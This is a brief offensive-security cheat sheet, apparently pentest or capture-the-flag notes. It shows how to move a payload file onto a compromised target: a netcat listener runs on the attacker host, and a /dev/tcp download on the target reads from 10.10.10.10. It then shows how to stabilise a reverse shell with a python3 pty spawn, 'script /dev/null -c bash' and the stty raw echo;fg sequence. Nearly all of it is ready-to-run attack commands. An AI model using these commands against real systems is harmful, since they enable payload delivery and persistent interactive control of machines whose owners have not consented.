FILE TRANSFER
1. netcat + cat 
IN HOST 
```
sudo nc -lvnp 80 < payload.txt
```
IN TARGET 
```
cat < /dev/tcp/10.10.10.10/80 > payload.txt
```

REV SHELL STABILIZATION
1. TYPICAL PYTHON3 DANCE
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
1. spawn an interactive shell
```
script /dev/null -c bash 
```
then proceed with background and `stty raw echo;fg` hit enter twice 